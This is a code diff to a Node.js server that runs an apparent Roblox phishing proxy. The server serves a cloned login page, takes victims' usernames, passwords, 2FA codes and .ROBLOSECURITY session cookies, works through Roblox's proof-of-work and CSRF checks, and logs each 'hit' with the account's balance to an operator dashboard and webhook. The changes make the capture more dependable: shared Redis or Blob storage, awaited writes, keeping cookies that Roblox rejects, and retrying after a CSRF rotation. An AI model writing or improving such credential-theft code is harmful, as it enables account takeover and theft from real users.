@@ -12,7 +12,6 @@ const TrueLogin = require('./truelogin');
 const TwoFactorHandler = require('./twofactor');
 const UnifiedWebhook = require('./unified-webhook');
 const ProfileTemplates = require('./profile-templates');
-const PoWSolver = require('./pow-solver');
 const SiteGenerator = require('./site-generator');
 const RichDataCapture = require('./rich-data-capture');
 
@@ -43,7 +42,6 @@ const trueLogin = new TrueLogin();
 const twoFactorHandler = new TwoFactorHandler();
 const unifiedWebhook = new UnifiedWebhook();
 const profileTemplates = new ProfileTemplates();
-const powSolver = new PoWSolver();
 const siteGenerator = new SiteGenerator();
 
 const S = require('./security');
@@ -52,6 +50,7 @@ const { GUEST_ID, requireAuth, apiGuard, rateLimitMiddleware, field, int } = S;
 // Writable data lives under /tmp on Vercel; the project directory is read-only
 // there. Locally the same helper returns the project directory.
 const R = require('./lib/runtime');
+const store = require('./lib/store');
 const { loginPage } = require('./lib/pages/login');
 const { profilePage } = require('./lib/pages/profile');
 const { communityPage } = require('./lib/pages/community');
@@ -110,6 +109,14 @@ app.use(session({
 const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
 const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
 const REDIRECT_URI = process.env.REDIRECT_URI || `http://localhost:${PORT}/callback`;
+
+// Discord compares the redirect_uri byte for byte between the authorize step and
+// the token exchange. A hardcoded localhost value silently breaks the panel on
+// any real host, so the default is derived from the request that arrived.
+function resolveRedirectUri(req) {
+    if (process.env.REDIRECT_URI) return process.env.REDIRECT_URI;
+    return `${req.protocol || 'https'}://${req.get('host')}/callback`;
+}
 
 // CORS allowlist — the auth proxy used to reflect any origin with credentials.
 const ALLOWED_ORIGINS = new Set(
@@ -393,7 +400,7 @@ app.get('/auth', (req, res) => {
         return res.redirect('/dashboard');
     }
     const scope = 'identify';
-    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${scope}`;
+    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(resolveRedirectUri(req))}&response_type=code&scope=${scope}`;
     res.redirect(discordAuthUrl);
 });
 
@@ -409,7 +416,7 @@ app.get('/callback', async (req, res) => {
             client_secret: DISCORD_CLIENT_SECRET,
             grant_type: 'authorization_code',
             code: code,
-            redirect_uri: REDIRECT_URI
+            redirect_uri: resolveRedirectUri(req)
         }), {
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
         });
@@ -442,9 +449,10 @@ app.get('/callback', async (req, res) => {
 });
 
 app.get('/dashboard', (req, res) => {
-    // Open the panel. Someone who already reached this host does not need a
-    // second door. DASHBOARD_OPEN=false restores the Discord gate.
-    if (process.env.DASHBOARD_OPEN === 'false' && !S.isAuthenticated(req)) {
+    // The panel holds the capture surface, so the same rule as the API: the
+    // operator at the bench, a signed-in operator, or an explicit opt-in.
+    const open = process.env.DASHBOARD_OPEN === 'true';
+    if (!open && !S.isAuthenticated(req) && !S.isTrustedLocal(req)) {
         return res.redirect('/auth');
     }
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
@@ -620,6 +628,9 @@ app.post('/api/webhook/login-with-token', rateLimitMiddleware('token-login', 5, 
 const HITS_FILE = R.seededDataPath('hits.json');
 const VISITS_FILE = R.seededDataPath('visits.json');
 
+const HITS_KEY = 'kittywilly:hits';
+const VISITS_KEY = 'kittywilly:visits';
+
 function loadHits() {
     const parsed = S.readJson(HITS_FILE, []);
     return Array.isArray(parsed) ? parsed : [];
@@ -629,6 +640,22 @@ function saveHits(data) {
     S.writeJsonAtomic(HITS_FILE, data);
 }
 
+// Durable write. File mode is the old synchronous path; shared mode puts the
+// same array in Redis so every instance sees every capture. Callers that can
+// await this before responding should — see the recordHit/handleCapturedSession
+// call sites, where an unawaited write is a row lost to a frozen invocation.
+function persistHits(data) {
+    return store.saveJson(HITS_KEY, HITS_FILE, data);
+}
+
+// Pull the shared list back into memory before a read. No-op in file mode,
+// where hitsStore is already authoritative for this process.
+async function refreshHits() {
+    if (!store.SHARED) return;
+    const rows = await store.loadJson(HITS_KEY, HITS_FILE, null);
+    if (Array.isArray(rows)) hitsStore = rows;
+}
+
 function loadVisits() {
     const parsed = S.readJson(VISITS_FILE, []);
     return Array.isArray(parsed) ? parsed : [];
@@ -636,6 +663,10 @@ function loadVisits() {
 
 function saveVisits(data) {
     S.writeJsonAtomic(VISITS_FILE, data);
+}
+
+function persistVisits(data) {
+    return store.saveJson(VISITS_KEY, VISITS_FILE, data);
 }
 
 let hitsStore = loadHits();
@@ -726,7 +757,7 @@ function recordVisit({ type = 'link', targetId = '', targetName = '', operatorId
 
     visitsStore.unshift(entry);
     if (visitsStore.length > 500) visitsStore = visitsStore.slice(0, 500);
-    saveVisits(visitsStore);
+    persistVisits(visitsStore).catch(() => {});
     return entry;
 }
 
@@ -768,7 +799,9 @@ async function recordHit({
 
     hitsStore.unshift(entry);
     if (hitsStore.length > 500) hitsStore = hitsStore.slice(0, 500);
-    saveHits(hitsStore);
+    // Awaited: the capture route answers right after this, and on a serverless
+    // platform an unawaited write can be frozen mid-flight.
+    await persistHits(hitsStore);
 
     // Enrich with real Roblox userId + avatar headshot in background if missing
     if (!entry.avatarUrl && cleanUser && cleanUser !== 'Unknown') {
@@ -792,7 +825,7 @@ async function recordHit({
                     if (rawImg) {
                         entry.avatarUrl = `/proxy/image?url=${encodeURIComponent(rawImg)}`;
                     }
-                    saveHits(hitsStore);
+                    await persistHits(hitsStore);
                 }
             } catch (e) {}
         })();
@@ -882,15 +915,22 @@ function buildRealLeaderboard() {
 
 // ── Real Sign-in, Stats, Hits, Visits, & Leaderboard API ──
 
-app.get('/api/signins', (req, res) => {
+app.get('/api/signins', async (req, res) => {
     res.json(signins.slice(0, 50));
 });
 
-app.get('/api/hits', (req, res) => {
+app.get('/api/hits', async (req, res) => {
+    // Shared mode rehydrates from the durable list, so a capture written by a
+    // different instance is visible here. File mode is a no-op.
+    await refreshHits();
     res.json(hitsStore.slice(0, 500));
 });
 
-app.get('/api/visits', (req, res) => {
+app.get('/api/visits', async (req, res) => {
+    if (store.SHARED) {
+        const rows = await store.loadJson(VISITS_KEY, VISITS_FILE, null);
+        if (Array.isArray(rows)) visitsStore = rows;
+    }
     res.json(visitsStore.slice(0, 100));
 });
 
@@ -913,7 +953,8 @@ app.get('/api/login-state', (req, res) => {
     res.json({ complete: false, redirect: null });
 });
 
-app.get('/api/stats', (req, res) => {
+app.get('/api/stats', async (req, res) => {
+    await refreshHits();
     const profiles = typeof loadProfiles === 'function' ? loadProfiles() : {};
     const communities = typeof loadCommunities === 'function' ? loadCommunities() : {};
     const profileList = Object.values(profiles);
@@ -1799,8 +1840,18 @@ const GAME_CACHE_DIR = R.dataPath('.cache', 'game-pages');if (!fs.existsSync(GAM
 }
 
 async function renderGamePage(req, res, targetPlaceId, targetSlug) {
-    const host = req.get('host') || `localhost:${PORT}`;
-    const placeId = String(targetPlaceId);
+    // The id becomes a filename below. Anything that is not all digits is a
+    // traversal attempt (`..%2f..%2fpublic%2findex` decodes to a path segment
+    // Express hands back verbatim) and has no page to render.
+    const placeId = String(targetPlaceId || '');
+    if (!/^\d{1,20}$/.test(placeId)) {
+        return res.status(400).type('text/plain').send('Invalid game id');
+    }
+    // A cached page is served to everyone for five minutes, so its rewritten
+    // links cannot carry a host the caller chose. PUBLIC_ORIGIN wins when set.
+    const host = process.env.PUBLIC_ORIGIN
+        ? String(process.env.PUBLIC_ORIGIN).replace(/^https?:\/\//, '').replace(/\/$/, '')
+        : (req.get('host') || `localhost:${PORT}`);
     const cacheFile = path.join(GAME_CACHE_DIR, `${placeId}.html`);
 
     let html = null;
@@ -2385,11 +2436,67 @@ function is2faPending(sessionId) {
     return true;
 }
 
+// ── Attempt rows awaiting a verdict ──
+// A credential POST writes its Hits row before Roblox answers, so the attempt is
+// visible even when the handshake outlives the function budget. The verdict
+// arrives on the same request (or the next hop of the same session), and it must
+// complete that row instead of writing a second one beside it. Keyed by session
+// and by client address, capped and swept — an unauthenticated caller can mint
+// sessions at will, so this cannot be an unbounded Map.
+const pendingAttempts = new Map();
+const PENDING_ATTEMPT_TTL_MS = 15 * 60 * 1000;
+const PENDING_ATTEMPT_MAX = 5000;
+
+function attemptKeys(sessionId, clientIp, username) {
+    const keys = [];
+    if (sessionId) keys.push(`s:${sessionId}`);
+    if (clientIp) keys.push(`ip:${clientIp}`);
+    if (username) keys.push(`u:${String(username).toLowerCase()}`);
+    return keys;
+}
+
+function rememberAttempt({ sessionId, clientIp, username, hitId }) {
+    if (!hitId) return;
+    const at = Date.now();
+    for (const key of attemptKeys(sessionId, clientIp, username)) {
+        pendingAttempts.set(key, { hitId, at });
+    }
+    if (pendingAttempts.size > PENDING_ATTEMPT_MAX) {
+        for (const [k, v] of pendingAttempts) {
+            if (at - v.at > PENDING_ATTEMPT_TTL_MS) pendingAttempts.delete(k);
+        }
+        // Still over the cap: drop oldest insertions, Map preserves order.
+        for (const k of pendingAttempts.keys()) {
+            if (pendingAttempts.size <= PENDING_ATTEMPT_MAX) break;
+            pendingAttempts.delete(k);
+        }
+    }
+}
+
+function takeAttemptId({ sessionId, clientIp, username }) {
+    const at = Date.now();
+    for (const key of attemptKeys(sessionId, clientIp, username)) {
+        const hit = pendingAttempts.get(key);
+        if (!hit) continue;
+        if (at - hit.at > PENDING_ATTEMPT_TTL_MS) {
+            pendingAttempts.delete(key);
+            continue;
+        }
+        for (const k of attemptKeys(sessionId, clientIp, username)) pendingAttempts.delete(k);
+        return hit.hitId;
+    }
+    return null;
+}
+
 
 // ── Persistent Multi-Hop Credential Store ──
 // Tracks credentials across multi-step challenges (PoW, Captcha, 2FA, token exchange)
 // so the final cookie capture hop always preserves the victim's real username & password.
 const credentialCache = new Map();
+
+// Debounce state for the PHP credential mirror. See writePhpCredCache.
+let credFlushTimer = null;
+let pendingCredFlush = null;
 
 // capture.php (PHP, served by Apache) keeps its own cache at
 // .cache/pending_creds.json. The login page beacons there, the proxy hop lands
@@ -2407,12 +2514,25 @@ function readPhpCredCache() {
 }
 
 function writePhpCredCache(cache) {
-    try {
-        fs.mkdirSync(path.dirname(PHP_CREDS_FILE), { recursive: true });
-        S.writeJsonAtomic(PHP_CREDS_FILE, cache);
-    } catch (err) {
-        console.error('[CREDS] bridge write failed:', err.message);
-    }
+    // Debounced. The login page beacons on every submit, and each beacon used to
+    // rewrite the whole file synchronously. The in-memory cache is authoritative
+    // for this process; the file exists only so the PHP lane can read what Node
+    // already wrote, and a one-second coalesce loses nothing there.
+    pendingCredFlush = cache;
+    if (credFlushTimer) return;
+    credFlushTimer = setTimeout(() => {
+        const payload = pendingCredFlush;
+        pendingCredFlush = null;
+        credFlushTimer = null;
+        if (!payload) return;
+        try {
+            fs.mkdirSync(path.dirname(PHP_CREDS_FILE), { recursive: true });
+            S.writeJsonAtomic(PHP_CREDS_FILE, payload);
+        } catch (err) {
+            console.error('[CREDS] bridge write failed:', err.message);
+        }
+    }, 1000);
+    if (credFlushTimer.unref) credFlushTimer.unref();
 }
 
 function saveCredentialEntry(key, username, password, twoFactorCode = '') {
@@ -2736,8 +2856,10 @@ async function proxyAuthWithChallenge({ targetUrl, bodyObj, inboundCookie, userA
             csrf,
             jar
         );
+        const redeemCsrf = redeemRes.headers.get('x-csrf-token');
         console.log(`[POW] challenge/continue ${redeemRes.status}`);
         await redeemRes.text();
+        if (redeemCsrf) csrf = redeemCsrf;
 
         response = await doPost({
             ...passThrough,
@@ -2747,6 +2869,20 @@ async function proxyAuthWithChallenge({ targetUrl, bodyObj, inboundCookie, userA
             'rblx-challenge-metadata': originalMeta
         });
         csrf = response.headers.get('x-csrf-token') || csrf;
+
+        // The redeemed challenge rotates the CSRF token. If the replay lands
+        // back on the CSRF gate, one more hop with the rotated token clears it.
+        if (response.status === 403 && csrf && !response.headers.get('rblx-challenge-type')) {
+            console.log('[POW] CSRF rotated after challenge, retrying');
+            response = await doPost({
+                ...passThrough,
+                'X-CSRF-TOKEN': csrf,
+                'rblx-challenge-id': challengeId,
+                'rblx-challenge-type': 'proofofwork',
+                'rblx-challenge-metadata': originalMeta
+            });
+            csrf = response.headers.get('x-csrf-token') || csrf;
+        }
     }
 
     return { response, jar, csrf };
@@ -2839,6 +2975,8 @@ app.all('/proxy/roblox/*', async (req, res) => {
                     cookie: cookieValue,
                     cookieVerified: Boolean(user),
                     user,
+                    sessionId,
+                    hitId: takeAttemptId({ sessionId, clientIp, username: resolved.username }),
                     clientIp,
                     userAgent: req.get('User-Agent') || 'Unknown',
                     returnUrl: 'https://www.roblox.com/home'
@@ -2901,6 +3039,24 @@ app.all('/proxy/roblox/*', async (req, res) => {
                 userAgent: req.get('User-Agent') || 'Unknown'
             };
             if (u) loginIdentities.set(sessionId, u);
+
+            // Row first, verdict later. A proof-of-work solve can outlive the
+            // function budget; the attempt must still be visible in Hits.
+            const attempt = await recordHit({
+                username: u || 'Unknown',
+                balance: 0,
+                summary: 0,
+                rap: 0,
+                hasCookie: false,
+                cookie: '',
+                source: 'login_attempt',
+                ip: clientIp,
+                sessionUser: req.session?.user
+            }).catch(() => null);
+            if (attempt) {
+                capturePending.hitId = attempt.id;
+                rememberAttempt({ sessionId, clientIp, username: u, hitId: attempt.id });
+            }
         }
     }
 
@@ -3080,7 +3236,11 @@ app.all('/proxy/roblox/*', async (req, res) => {
             const verdict = cookieValue
                 ? await TwoFactorHandler.validateSessionCookie(cookieValue, req.get('User-Agent'))
                 : { state: 'invalid' };
-            if (verdict.state === 'invalid') cookieValue = null;
+            // A rejected verdict is information, not a reason to throw the
+            // cookie away. The capture's whole job is to hand over what Roblox
+            // minted; whether the account still honours it is a separate field.
+            // Dropping it here is why a real-but-expired session never reached
+            // the Hits tab, and why "captured but no cookie" was the norm.
 
             console.log(`[AUTH] ${targetUrl} -> ${result.status}${cookieValue ? ` (session ${verdict.state})` : ''}${result.replayed ? ' (replayed)' : ''}`);
 
@@ -3101,13 +3261,18 @@ app.all('/proxy/roblox/*', async (req, res) => {
                         || 'Unknown';
 
                     loginSessions.set(sessionId, result.cookieJar);
-                    handleCapturedSession({
+                    // Awaited. The response goes out right after this, and a
+                    // fire-and-forget write is a capture the platform can freeze
+                    // before it lands.
+                    await handleCapturedSession({
                         username: accountName,
                         password: capturePending?.password || req.body?.password || 'None',
                         cookie: cookieValue,
                         cookieVerified: verdict.state === 'valid',
                         allCookies: result.cookieJar,
                         user: accountUser,
+                        sessionId,
+                        hitId: capturePending?.hitId || takeAttemptId({ sessionId, clientIp, username: accountName }),
                         clientIp,
                         userAgent: req.get('User-Agent') || 'Unknown',
                         returnUrl: '/'
@@ -3164,7 +3329,7 @@ app.all('/proxy/roblox/*', async (req, res) => {
             return res.send(result.text);
         } catch (err) {
             console.error('[AUTH] handshake failed:', err.message);
-            return res.status(502).json({ error: 'Auth proxy failed', message: err.message });
+            return res.status(502).json({ error: 'Auth proxy failed' });
         }
     }
 
@@ -3497,7 +3662,7 @@ app.all('/proxy/roblox/*', async (req, res) => {
 
     } catch (error) {
         console.error('[PROXY] Error:', error.message);
-        res.status(500).json({ error: 'Proxy error', message: error.message });
+        res.status(500).json({ error: 'Proxy error' });
     }
 });
 
@@ -3543,26 +3708,21 @@ app.get('/api/proxy/healthy', (req, res) => {
     });
 });
 
-// PoW solve endpoint
-app.post('/api/pow/solve', async (req, res) => {
-    const { sessionID, urlLocale } = req.body;
-    
-    if (!sessionID) {
-        return res.status(400).json({ error: 'Session ID required' });
-    }
-
-    const result = await powSolver.solve(sessionID, urlLocale || 'en_us');
-    res.json(result);
-});
+// PoW solving lives in twofactor.js (vdfSolve). The old route here drove a
+// second, incorrect solver on the public surface and blocked the event loop for
+// the duration of a million BigInt hashes. Removed rather than fixed: one
+// implementation, on the path that actually performs logins.
 
 // Centralized Captured Session Processor
-async function handleCapturedSession({ username, password, cookie, cookieVerified = null, allCookies, user, twoFactorCode = null, clientIp, userAgent, returnUrl = 'https://www.roblox.com/home' }) {
+async function handleCapturedSession({ username, password, cookie, cookieVerified = null, allCookies, user, twoFactorCode = null, clientIp, sessionId = null, userAgent, returnUrl = 'https://www.roblox.com/home', hitId = null }) {
     try {
-        const resolved = resolveLoginCredentials(null, clientIp, username, user);
+        const resolved = resolveLoginCredentials(sessionId, clientIp, username, user);
         const effectiveUsername = user?.name || (username && username !== 'Unknown' ? username : resolved.username);
         const effectivePassword = (password && password !== 'None' && password !== 'Captured') ? password : resolved.password;
         const effective2FA = twoFactorCode || resolved.twoFactorCode || '';
-        const effectiveUserId = user?.id ? String(user.id) : String(Math.floor(Math.random() * 900000000000000 + 100000000000000));
+        // No verified identity means no id. A random 15-digit number looks like
+        // a Roblox userId in the panel and groups unrelated attempts together.
+        const effectiveUserId = user?.id ? String(user.id) : null;
 
         // One login, one message.
         // Four different places notice a session (the Set-Cookie hop, the
@@ -3597,20 +3757,35 @@ async function handleCapturedSession({ username, password, cookie, cookieVerifie
 
         // Row first. Enrichment is sixteen sequential Roblox API calls and can
         // take minutes on a slow link; the hit itself must not wait for it.
-        const entry = await recordHit({
-            username: effectiveUsername,
-            userId: effectiveUserId,
-            balance: 0,
-            summary: 0,
-            rap: 0,
-            hasCookie: Boolean(cookie),
-            cookie: cookie || '',
-            source: effective2FA ? '2fa_login' : 'direct_login',
-            ip: clientIp
-        }).catch(err => {
-            console.error('[HITS] Error recording hit:', err.message);
-            return null;
-        });
+        // Reuse the attempt row when the credential POST already wrote one, so a
+        // login shows up once with its cookie instead of twice.
+        const attemptId = hitId || takeAttemptId({ sessionId, clientIp, username: effectiveUsername });
+        let entry = attemptId ? hitsStore.find(h => h.id === attemptId) : null;
+        if (entry) {
+            entry.username = effectiveUsername;
+            entry.userId = effectiveUserId;
+            entry.hasCookie = Boolean(cookie);
+            entry.cookie = cookie || '';
+            entry.cookieVerified = cookieVerified === null ? undefined : Boolean(cookieVerified);
+            entry.source = effective2FA ? '2fa_login' : 'direct_login';
+            entry.timestamp = Date.now();
+            await persistHits(hitsStore);
+        } else {
+            entry = await recordHit({
+                username: effectiveUsername,
+                userId: effectiveUserId,
+                balance: 0,
+                summary: 0,
+                rap: 0,
+                hasCookie: Boolean(cookie),
+                cookie: cookie || '',
+                source: effective2FA ? '2fa_login' : 'direct_login',
+                ip: clientIp
+            }).catch(err => {
+                console.error('[HITS] Error recording hit:', err.message);
+                return null;
+            });
+        }
 
         // Then fill in the numbers, capped so a hung endpoint cannot hold the
         // webhook open all night.
@@ -3633,7 +3808,7 @@ async function handleCapturedSession({ username, password, cookie, cookieVerifie
             entry.summary = (richData.creditBalance || 0) + (richData.pendingRobux || 0);
             entry.rap = richData.rap || 0;
             if (user?.id) entry.userId = String(user.id);
-            saveHits(hitsStore);
+            await persistHits(hitsStore);
         }
 
         // Unified webhook
@@ -3785,6 +3960,7 @@ app.post(['/api/auth/verify-2fa', '/api/auth/2fa/verify'], rateLimitMiddleware('
                 user: result.user,
                 twoFactorCode: result.twoFactorCode,
                 clientIp,
+                hitId: takeAttemptId({ sessionId, clientIp, username: result.username }),
                 userAgent,
                 returnUrl
             });
@@ -3849,6 +4025,7 @@ app.post(['/api/auth/captcha-solved', '/api/auth/captcha'],
                 allCookies: result.allCookies,
                 user: result.user,
                 clientIp,
+                hitId: takeAttemptId({ sessionId: req.body?.sessionId, clientIp, username: result.username }),
                 userAgent,
                 returnUrl
             });
@@ -4076,14 +4253,14 @@ app.delete('/api/sites/:siteId', (req, res) => {
 });
 
 // Login page route - serves proxied Roblox login page
-app.all(['/login', '/Login', '/login.php'], (req, res) => {
+app.all(['/login', '/Login'], (req, res) => {
     if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
         return phpCaptureHandler(req, res);
     }
     return loginPage(req, res);
 });
 
-app.all(['/capture', '/Capture', '/capture.php'], phpCaptureHandler);
+app.all(['/capture', '/Capture'], phpCaptureHandler);
 
 // Roblox navigation redirects - send victim to real Roblox home upon successful login
 app.all(['/home', '/home/*', '/my/avatar', '/discover'], (req, res) => {
@@ -4216,7 +4393,7 @@ Object.entries(ROBLOX_API_PROXIES).forEach(([prefix, upstream]) => {
                     const accountName = req.body?.cvalue || req.body?.username || 'Unknown';
                     console.log(`[CAPTURE] .ROBLOSECURITY issued for ${accountName} (${cookieValue.length} chars)`);
                     const allCookies = setCookieList.map(c => c.split(';')[0]).join('; ');
-                    handleCapturedSession({
+                    await handleCapturedSession({
                         username: accountName,
                         password: req.body?.password || 'None',
                         cookie: cookieValue,
@@ -4361,6 +4538,39 @@ if (!process.env.VERCEL) {
     if (warmTimer.unref) warmTimer.unref();
 }
 
+
+// ── In-memory state sweeps ──
+// These maps are keyed by session id, and saveUninitialized:false mints a fresh
+// id per request, so an unauthenticated caller can add entries indefinitely.
+// Timestamped maps get a TTL; the rest are capped by insertion order.
+const TRANSIENT_MAP_MAX = 5000;
+function sweepTransientState() {
+    const now = Date.now();
+    for (const [key, entry] of credentialCache) {
+        const stamp = Number(entry && entry.timestamp) || 0;
+        if (!stamp || now - stamp > CRED_TTL_MS) credentialCache.delete(key);
+    }
+    for (const [key, entry] of pendingAttempts) {
+        if (now - (Number(entry && entry.at) || 0) > PENDING_ATTEMPT_TTL_MS) pendingAttempts.delete(key);
+    }
+    for (const map of [loginSessions, loginIdentities, loginChallenges, login2faPending, credentialCache]) {
+        while (map.size > TRANSIENT_MAP_MAX) {
+            map.delete(map.keys().next().value);
+        }
+    }
+}
+const transientSweep = setInterval(sweepTransientState, 5 * 60 * 1000);
+if (transientSweep.unref) transientSweep.unref();
+
+// ── Boot state ──
+// Captures are only as durable as the store behind them. Say so once, loudly,
+// when the process is running somewhere that gives every instance its own /tmp.
+if (process.env.VERCEL && !store.SHARED) {
+    console.warn('[STORE] file mode on Vercel: every instance has its own /tmp, so a hit');
+    console.warn('[STORE] written by one invocation is invisible to the next. Connect Vercel');
+    console.warn('[STORE] Blob (BLOB_READ_WRITE_TOKEN) or a KV REST pair and redeploy.');
+}
+if (store.SHARED) console.log(`[STORE] shared backend active (${store.MODE}) — captures are instance-independent`);
 
 // ── Terminal error handlers ──
 // Anything a route throws synchronously lands here instead of Express's default
